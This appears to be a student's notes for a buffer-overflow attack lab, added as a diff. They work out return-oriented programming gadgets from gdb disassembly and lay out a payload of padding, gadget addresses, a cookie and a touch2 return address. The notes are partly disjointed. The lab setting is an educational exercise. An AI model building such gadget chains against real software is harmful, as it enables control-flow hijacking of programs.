@@ -1,0 +1,123 @@
+Gadget 1 options:
+- Will pop register rax starting at the 4th byte
+- Need the pop to be at the end order of the bytes
+
+1. 
+000000000040176d <setval_210>:
+  40176d:	c7 07 d4 48 89 c7    	movl   $0xc78948d4,(%rdi)
+  401773:	c3                   	retq   
+
+0x40176d + 0x3 = 0x401770
+
+(gdb) x/i setval_210+3
+0x401770 <setval_210+3>:     mov    %rax,%rdi
+(gdb) x/i setval_210+4
+0x401771 <setval_210+4>:     mov    %eax,%edi
+(gdb) x/i setval_210+5
+0x401772 <setval_210+5>:     mov    $0x90587db8,%ebx
+
+
+2. 
+000000000040177a <setval_108>:
+  40177a:	c7 07 49 48 89 c7    	movl   $0xc7894849,(%rdi)
+  401780:	c3                   	retq   
+
+0x40177a + 0x3 = 0x40177D
+
+(gdb) x/i setval_108+3
+0x40177d <setval_108+3>:     mov    %rax,%rdi
+(gdb) x/i setval_108+4
+0x40177e <setval_108+4>:     mov    %eax,%edi
+(gdb) x/i setval_108+5
+0x40177f <setval_108+5>:     mov    $0xc7894ab8,%ebx
+
+----------------------------------------------------------------
+
+Gadget 2 options:
+- Need to move my cookie from rax/eax/rsp into the rdi register
+- Look for 58 to 5f in the gadgets
+- 58 is the 4th byte in the sequence, want c3 for a return
+
+1. 
+000000000040178d <setval_239>:
+  40178d:	c7 07 d5 58 90 c3    	movl   $0xc39058d5,(%rdi)
+  401793:	c3                   	retq 
+  
+0x40178d + 0x3 = 0x401790
+  
+  
+0x401790 <setval_239+3>:     pop    %rax
+(gdb) x/i setval_239+4
+0x401791 <setval_239+4>:     nop
+(gdb) x/i setval_239+5
+0x401792 <setval_239+5>:     retq   
+
+
+2.
+0000000000401774 <getval_416>:
+  401774:	b8 7d 58 90 90       	mov    $0x9090587d,%eax
+  401779:	c3                   	retq   
+  
+0x401774 + 0x2 = 0x401776
+
+
+(gdb) x/i getval_416+2
+   0x401776 <getval_416+2>:     pop    %rax
+(gdb) x/i getval_416+3
+   0x401777 <getval_416+3>:     nop
+(gdb) x/i getval_416+4
+   0x401778 <getval_416+4>:     nop
+(gdb) x/i getval_416+5
+   0x401779 <getval_416+5>:     retq   
+(gdb) 
+
+
+
+
+/* buffer padding of 56 bytes */
+/* gadget 1: pop rax register starts at 4th byte, where 58 starts */
+/* cookie */
+/* gadget 2: move cookie into %rdi, cookie is stored in rax/eax/rsp */
+/* touch2 return address */
+
+
+
+
+
+
+(gdb) x/x 0x0000000000401568
+0x401568 <getbuf>:      0x38ec8348   ->    0x0000000000401568 <+0>:     sub    $0x38,%rsp
+
+gdb) x/x 0x000000000040156c
+0x40156c <getbuf+4>:    0xe8e78948   ->    0x000000000040156c <+4>:     mov    %rsp,%rdi
+
+(gdb) x/x 0x000000000040156f
+0x40156f <getbuf+7>:    0x0003b6e8
+
+
+
+
+
+
+(gdb) x/s 0x6f1fc0
+0x6f1fc0 <_IO_stdfile_1_lock>:  ""
+(gdb) x/s 0x6f8c60
+0x6f8c60:       "Type string:7dd803\n"
+
+
+
+
+0xec8348c3
+
+
+(gdb) x/x $rsp
+0x7fffffffb4b0: 0x7dd80300
+(gdb) x/x $rdi
+0x6ee9c0 <_IO_2_1_stdin_>:      0xfbad2088
+
+
+(gdb) x/x $rsp
+0x7ffffffc0ac8: 0x00401743
+(gdb) x/x 0x00401743
+0x401743 <test+14>:     0x8d48c289
+
